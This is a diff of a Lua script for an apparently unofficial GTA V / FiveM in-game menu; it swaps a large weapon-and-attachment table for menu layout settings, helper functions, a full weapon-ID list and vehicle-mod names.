-                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Small Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Large Scope',
-                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                Barrel = {
-                    {
-                        name = '~h~~p~▶ ~s~Default',
-                        id = 'COMPONENT_AT_SC_BARREL_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy',
-                        id = 'COMPONENT_AT_SC_BARREL_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Flat Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tactical Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Fat-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Precision Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_04'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy Duty Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_05'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Slanted Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_06'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Split-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_07'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP_02'
-                    }
-                }
-            }
-        },
-        BullpupRifle = {
-            id = 'weapon_bullpuprifle',
-            name = '~h~~p~▶ ~s~Bullpup Rifle',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_BULLPUPRIFLE_CLIP_02'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_SMALL'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        BullpupRifleMkII = {
-            id = 'weapon_bullpuprifle_mk2',
-            name = '~h~~p~▶ ~s~Bullpup Rifle Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Armor Piercing Rounds',
-                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Small Scope',
-                        id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Medium Scope',
-                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                Barrel = {
-                    {
-                        name = '~h~~p~▶ ~s~Default',
-                        id = 'COMPONENT_AT_BP_BARREL_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy',
-                        id = 'COMPONENT_AT_BP_BARREL_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Flat Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tactical Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Fat-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Precision Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_04'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy Duty Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_05'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Slanted Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_06'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Split-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_07'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        CompactRifle = {
-            id = 'weapon_compactrifle',
-            name = '~h~~p~▶ ~s~Compact Rifle',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_COMPACTRIFLE_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_COMPACTRIFLE_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Drum Magazine',
-                        id = 'COMPONENT_COMPACTRIFLE_CLIP_03'
-                    }
-                }
-            }
-        }
-    },
-    LMG = {
-        MG = {
-            id = 'weapon_mg',
-            name = '~h~~p~▶ ~s~MG',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_MG_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_MG_CLIP_02'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_SMALL_02'
-                    }
-                }
-            }
-        },
-        CombatMG = {
-            id = 'weapon_combatmg',
-            name = '~h~~p~▶ ~s~Combat MG',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_COMBATMG_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_COMBATMG_CLIP_02'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_MEDIUM'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        CombatMGMkII = {
-            id = 'weapon_combatmg_mk2',
-            name = '~h~~p~▶ ~s~Combat MG Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_COMBATMG_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_COMBATMG_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
-                        id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Medium Scope',
-                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Large Scope',
-                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
-                    }
-                },
-                Barrel = {
-                    {
-                        name = '~h~~p~▶ ~s~Default',
-                        id = 'COMPONENT_AT_MG_BARREL_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy',
-                        id = 'COMPONENT_AT_MG_BARREL_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Flat Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tactical Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Fat-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Precision Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_04'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy Duty Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_05'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Slanted Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_06'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Split-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_07'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP_02'
-                    }
-                }
-            }
-        },
-        GusenbergSweeper = {
-            id = 'weapon_gusenberg',
-            name = '~h~~p~▶ ~s~GusenbergSweeper',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_GUSENBERG_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_GUSENBERG_CLIP_02'
-                    }
-                }
-            }
-        }
-    },
-    Snipers = {
-        SniperRifle = {
-            id = 'weapon_sniperrifle',
-            name = '~h~~p~▶ ~s~Sniper Rifle',
-            bInfAmmo = false,
-            mods = {
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_LARGE'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Advanced Scope',
-                        id = 'COMPONENT_AT_SCOPE_MAX'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP_02'
-                    }
-                }
-            }
-        },
-        HeavySniper = {
-            id = 'weapon_heavysniper',
-            name = '~h~~p~▶ ~s~Heavy Sniper',
-            bInfAmmo = false,
-            mods = {
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_LARGE'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Advanced Scope',
-                        id = 'COMPONENT_AT_SCOPE_MAX'
-                    }
-                }
-            }
-        },
-        HeavySniperMkII = {
-            id = 'weapon_heavysniper_mk2',
-            name = '~h~~p~▶ ~s~Heavy Sniper Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Armor Piercing Rounds',
-                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Explosive Rounds',
-                        id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Zoom Scope',
-                        id = 'COMPONENT_AT_SCOPE_LARGE_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Advanced Scope',
-                        id = 'COMPONENT_AT_SCOPE_MAX'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Nigt Vision Scope',
-                        id = 'COMPONENT_AT_SCOPE_NV'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Thermal Scope',
-                        id = 'COMPONENT_AT_SCOPE_THERMAL'
-                    }
-                },
-                Barrel = {
-                    {
-                        name = '~h~~p~▶ ~s~Default',
-                        id = 'COMPONENT_AT_SR_BARREL_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy',
-                        id = 'COMPONENT_AT_SR_BARREL_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_SR_SUPP_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Squared Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_08'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Bell-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_09'
-                    }
-                }
-            }
-        },
-        MarksmanRifle = {
-            id = 'weapon_marksmanrifle',
-            name = '~h~~p~▶ ~s~Marksman Rifle',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_MARKSMANRIFLE_CLIP_02'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Scope',
-                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP'
-                    }
-                }
-            }
-        },
-        MarksmanRifleMkII = {
-            id = 'weapon_marksmanrifle_mk2',
-            name = '~h~~p~▶ ~s~Marksman Rifle Mk II',
-            bInfAmmo = false,
-            mods = {
-                Magazines = {
-                    {
-                        name = '~h~~p~▶ ~s~Default Magazine',
-                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Extended Magazine',
-                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tracer Rounds',
-                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Incendiary Rounds',
-                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Hollow Point Rounds',
-                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~FMJ Rounds',
-                        id = 'COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	'
-                    }
-                },
-                Sights = {
-                    {
-                        name = '~h~~p~▶ ~s~Holograhpic Sight',
-                        id = 'COMPONENT_AT_SIGHTS'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Large Scope',
-                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Zoom Scope',
-                        id = 'COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2'
-                    }
-                },
-                Flashlight = {
-                    {
-                        name = '~h~~p~▶ ~s~Flashlight',
-                        id = 'COMPONENT_AT_AR_FLSH'
-                    }
-                },
-                Barrel = {
-                    {
-                        name = '~h~~p~▶ ~s~Default',
-                        id = 'COMPONENT_AT_MRFL_BARREL_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy',
-                        id = 'COMPONENT_AT_MRFL_BARREL_02'
-                    }
-                },
-                BarrelAttachments = {
-                    {
-                        name = '~h~~p~▶ ~s~Suppressor',
-                        id = 'COMPONENT_AT_AR_SUPP'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Flat Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_01'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Tactical Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_02'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Fat-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_03'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Precision Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_04'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Heavy Duty Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_05'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Slanted Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_06'
-                    },
-                    {
-                        name = '~h~~p~▶ ~s~Split-End Muzzle Brake',
-                        id = 'COMPONENT_AT_MUZZLE_07'
-                    }
-                },
-                Grips = {
-                    {
-                        name = '~h~~p~▶ ~s~Grip',
-                        id = 'COMPONENT_AT_AR_AFGRIP_02'
-                    }
-                }
-            }
-        }
-    },
-    Heavy = {
-        RPG = {
-            id = 'weapon_rpg',
-            name = '~h~~p~▶ ~s~RPG',
-            bInfAmmo = false,
-            mods = {}
-        },
-        GrenadeLauncher = {
-            id = 'weapon_grenadelauncher',
-            name = '~h~~p~▶ ~s~Grenade Launcher',
-            bInfAmmo = false,
-            mods = {}
-        },
-        GrenadeLauncherSmoke = {
-            id = 'weapon_grenadelauncher_smoke',
-            name = '~h~~p~▶ ~s~Grenade Launcher Smoke',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Minigun = {
-            id = 'weapon_minigun',
-            name = '~h~~p~▶ ~s~Minigun',
-            bInfAmmo = false,
-            mods = {}
-        },
-        FireworkLauncher = {
-            id = 'weapon_firework',
-            name = '~h~~p~▶ ~s~Firework Launcher',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Railgun = {
-            id = 'weapon_railgun',
-            name = '~h~~p~▶ ~s~Railgun',
-            bInfAmmo = false,
-            mods = {}
-        },
-        HomingLauncher = {
-            id = 'weapon_hominglauncher',
-            name = '~h~~p~▶ ~s~Homing Launcher',
-            bInfAmmo = false,
-            mods = {}
-        },
-        CompactGrenadeLauncher = {
-            id = 'weapon_compactlauncher',
-            name = '~h~~p~▶ ~s~Compact Grenade Launcher',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Widowmaker = {
-            id = 'weapon_rayminigun',
-            name = '~h~~p~▶ ~s~Widowmaker',
-            bInfAmmo = false,
-            mods = {}
-        }
-    },
-    Throwables = {
-        Grenade = {
-            id = 'weapon_grenade',
-            name = '~h~~p~▶ ~s~Grenade',
-            bInfAmmo = false,
-            mods = {}
-        },
-        BZGas = {
-            id = 'weapon_bzgas',
-            name = '~h~~p~▶ ~s~BZ Gas',
-            bInfAmmo = false,
-            mods = {}
-        },
-        MolotovCocktail = {
-            id = 'weapon_molotov',
-            name = '~h~~p~▶ ~s~Molotov Cocktail',
-            bInfAmmo = false,
-            mods = {}
-        },
-        StickyBomb = {
-            id = 'weapon_stickybomb',
-            name = '~h~~p~▶ ~s~Sticky Bomb',
-            bInfAmmo = false,
-            mods = {}
-        },
-        ProximityMines = {
-            id = 'weapon_proxmine',
-            name = '~h~~p~▶ ~s~Proximity Mines',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Snowballs = {
-            id = 'weapon_snowball',
-            name = '~h~~p~▶ ~s~Snowballs',
-            bInfAmmo = false,
-            mods = {}
-        },
-        PipeBombs = {
-            id = 'weapon_pipebomb',
-            name = '~h~~p~▶ ~s~Pipe Bombs',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Baseball = {
-            id = 'weapon_ball',
-            name = '~h~~p~▶ ~s~Baseball',
-            bInfAmmo = false,
-            mods = {}
-        },
-        TearGas = {
-            id = 'weapon_smokegrenade',
-            name = '~h~~p~▶ ~s~Tear Gas',
-            bInfAmmo = false,
-            mods = {}
-        },
-        Flare = {
-            id = 'weapon_flare',
-            name = '~h~~p~▶ ~s~Flare',
-            bInfAmmo = false,
-            mods = {}
-        }
-    },
-    Misc = {
-        Parachute = {
-            id = 'gadget_parachute',
-            name = '~h~~p~▶ ~s~Parachute',
-            bInfAmmo = false,
-            mods = {}
-        },
-        FireExtinguisher = {
-            id = 'weapon_fireextinguisher',
-            name = '~h~~p~▶ ~s~Fire Extinguisher',
-            bInfAmmo = false,
-            mods = {}
-        }
-    }
+local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
+local optionCount = 0
+
+local currentKey = nil
+local currentMenu = nil
+
+local titleHeight = 0.11
+local titleYOffset = 0.03
+local titleScale = 1.0
+
+local buttonHeight = 0.038
+local buttonFont = 0
+local buttonScale = 0.365
+local buttonTextXOffset = 0.005
+local buttonTextYOffset = 0.005
+
+function math.round(num, numDecimalPlaces)
+    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
+end
+
+local function RGBou328h(frequency)
+    local result = {}
+    local curtime = GetGameTimer() / 1000
+
+    result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
+    result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
+    result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
+
+    return result
+end
+
+local allWeapons = {
+"WEAPON_KNIFE",
+"WEAPON_KNUCKLE",
+"WEAPON_NIGHTSTICK",
+"WEAPON_HAMMER",
+"WEAPON_BAT",
+"WEAPON_GOLFCLUB",
+"WEAPON_CROWBAR",
+"WEAPON_BOTTLE",
+"WEAPON_DAGGER",
+"WEAPON_HATCHET",
+"WEAPON_MACHETE",
+"WEAPON_FLASHLIGHT",
+"WEAPON_SWITCHBLADE",
+"WEAPON_PISTOL",
+"WEAPON_PISTOL_MK2",
+"WEAPON_COMBATPISTOL",
+"WEAPON_APPISTOL",
+"WEAPON_PISTOL50",
+"WEAPON_SNSPISTOL",
+"WEAPON_HEAVYPISTOL",
+"WEAPON_VINTAGEPISTOL",
+"WEAPON_STUNGUN",
+"WEAPON_FLAREGUN",
+"WEAPON_MARKSMANPISTOL",
+"WEAPON_REVOLVER",
+"WEAPON_MICROSMG",
+"WEAPON_SMG",
+"WEAPON_SMG_MK2",
+"WEAPON_ASSAULTSMG",
+"WEAPON_MG",
+"WEAPON_COMBATMG",
+"WEAPON_COMBATMG_MK2",
+"WEAPON_COMBATPDW",
+"WEAPON_GUSENBERG",
+"WEAPON_MACHINEPISTOL",
+"WEAPON_ASSAULTRIFLE",
+"WEAPON_ASSAULTRIFLE_MK2",
+"WEAPON_CARBINERIFLE",
+"WEAPON_CARBINERIFLE_MK2",
+"WEAPON_ADVANCEDRIFLE",
+"WEAPON_SPECIALCARBINE",
+"WEAPON_BULLPUPRIFLE",
+"WEAPON_COMPACTRIFLE",
+"WEAPON_PUMPSHOTGUN",
+"WEAPON_SAWNOFFSHOTGUN",
+"WEAPON_BULLPUPSHOTGUN",
+"WEAPON_ASSAULTSHOTGUN",
+"WEAPON_MUSKET",
+"WEAPON_HEAVYSHOTGUN",
+"WEAPON_DBSHOTGUN",
+"WEAPON_SNIPERRIFLE",
+"WEAPON_HEAVYSNIPER",
+"WEAPON_HEAVYSNIPER_MK2",
+"WEAPON_MARKSMANRIFLE",
+"WEAPON_GRENADELAUNCHER",
+"WEAPON_GRENADELAUNCHER_SMOKE",
+"WEAPON_RPG",
+"WEAPON_STINGER",
+"WEAPON_FIREWORK",
+"WEAPON_HOMINGLAUNCHER",
+"WEAPON_GRENADE",
+"WEAPON_STICKYBOMB",
+"WEAPON_PROXMINE",
+"WEAPON_BZGAS",
+"WEAPON_SMOKEGRENADE",
+"WEAPON_MOLOTOV",
+"WEAPON_FIREEXTINGUISHER",
+"WEAPON_PETROLCAN",
+"WEAPON_SNOWBALL",
+"WEAPON_FLARE",
+"WEAPON_BALL",
+"WEAPON_MINIGUN"
 }
-local b8 = false
-local b9 = false
-local ba = false
-local bb = false
-local bc = nil
-local bd = {}
-local be = {}
-local bf = nil
-local bg = false
-local bh = -1
-local bi = -1
-local bj = -1
-local bk = false
+
+local function debugPrint(text)
+    if BrutanPremium.debug then
+        Citizen.Trace("[Plane] "..tostring(text))
+    end
+end
+
+
+local function setMenuProperty(id, property, value)
+    if id and menus[id] then
+        menus[id][property] = value
+        debugPrint(id.." menu property changed: { "..tostring(property)..", "..tostring(value).." }")
+    end
+end
+
+    function BrutanPremium.SetSpriteColor(id, r, g, b, a)
+        setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
+    end
+
+local function isMenuVisible(id)
+    if id and menus[id] then
+        return menus[id].visible
+    else
+        return false
+    end
+end
+
+if GetVehiclePedIsUsing(PlayerPedId()) then
+    veh = GetVehiclePedIsUsing(PlayerPedId())
+end
+
+local bv = false
+
+local bx = GetPlayerServerId(PlayerPedId(-1))
+local by = GetPlayerName(bx)
+
 local bl = {
     {
-        name = '~h~Spoilers',
+        name = "~h~Spoilers",
         id = 0
     },
     {
-        name = '~h~Front Bumper',
+        name = "~h~Front Bumper",
         id = 1
     },
     {
-        name = '~h~Rear Bumper',
+        name = "~h~Rear Bumper",
         id = 2
     },
     {
-        name = '~h~Side Skirt',
+        name = "~h~Side Skirt",
         id = 3
     },
     {
-        name = '~h~Exhaust',
+        name = "~h~Exhaust",
         id = 4
     },
     {
-        name = '~h~Frame',
+        name = "~h~Frame",
         id = 5
     },
     {
-        name = '~h~Grille',
+        name = "~h~Grille",
         id = 6
     },
     {
-        name = '~h~Hood',
+        name = "~h~Hood",
         id = 7
     },
     {
-        name = '~h~Fender',
+        name = "~h~Fender",
         id = 8
     },
     {
-        name = '~h~Right Fender',
+        name = "~h~Right Fender",
         id = 9
     },
     {
-        name = '~h~Roof',
+        name = "~h~Roof",
         id = 10
     },
     {
-        name = '~h~Vanity Plates',
+        name = "~h~Vanity Plates",
         id = 25
     },
     {
-        name = '~h~Trim',
+        name = "~h~Trim",
         id = 27
     },
     {
-        name = '~h~Ornaments',
+        name = "~h~Ornaments",
         id = 28
     },
     {
-        name = '~h~Dashboard',
+        name = "~h~Dashboard",
         id = 29
     },
     {
-        name = '~h~Dial',
+        name = "~h~Dial",
         id = 30
     },
     {
-        name = '~h~Door Speaker',
+        name = "~h~Door Speaker",
         id = 31
     },
     {
-        name = '~h~Seats',
+        name = "~h~Seats",
         id = 32
     },
     {
-        name = '~h~Steering Wheel',
+        name = "~h~Steering Wheel",
         id = 33
     },
     {
-        name = '~h~Shifter Leavers',
+        name = "~h~Shifter Leavers",
         id = 34
     },
     {
